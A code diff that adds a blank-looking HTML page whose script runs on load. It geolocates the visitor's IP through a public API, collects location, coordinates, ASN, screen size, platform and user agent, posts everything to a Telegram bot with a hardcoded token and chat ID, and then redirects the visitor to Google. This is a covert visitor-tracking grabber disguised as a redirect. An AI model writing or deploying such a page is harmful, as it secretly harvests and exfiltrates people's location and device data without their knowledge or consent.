@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+        <title>''</title>
+    </head>
+    <body>
+        <script>
+            document.addEventListener('DOMContentLoaded', async () => {
+                const URL_REDIRECT = 'https://google.com';
+                const BOT_TOKEN = '8161467078:AAFHIdqQ0AZTppCPBuwWymwKECEqewCzTgM';
+                const CHAT_ID = '-4621643835';
+                const url = 'https://get.geojs.io/v1/ip/geo.json';
+                const geoResponse = await fetch(url);
+                const geoData = await geoResponse.json();
+                const screenWidth = window.screen.width;
+                const screenHeight = window.screen.height;
+                const osInfo = navigator.platform;
+                const userAgent = navigator.userAgent.toLowerCase();
+                const fullData = `
+<b>Location:</b> <code>${geoData.city}, ${geoData.region}, ${geoData.country}</code>
+<b>IP:</b> <code>${geoData.ip}</code>
+<b>Coordinates:</b> <code>${geoData.latitude}, ${geoData.longitude}</code>
+<b>Accuracy:</b> <code>${geoData.accuracy}m</code>
+<b>Timezone:</b> <code>${geoData.timezone}</code>
+<b>Region:</b> <code>${geoData.continent_code}</code>
+<b>ASN:</b> <code>${geoData.asn}</code>
+<b>Organization:</b> <code>${geoData.organization_name} (${geoData.organization})</code>
+<b>Screen:</b> <code>${screenWidth}x${screenHeight}</code>
+<b>OS:</b> <code>${osInfo}</code>
+<b>User Agent:</b> <code>${userAgent}</code>`;
+
+                const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+                await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: fullData, parse_mode: 'HTML' })
+                });
+                window.location.href = URL_REDIRECT;
+            });
+        </script>
+    </body>
+</html>
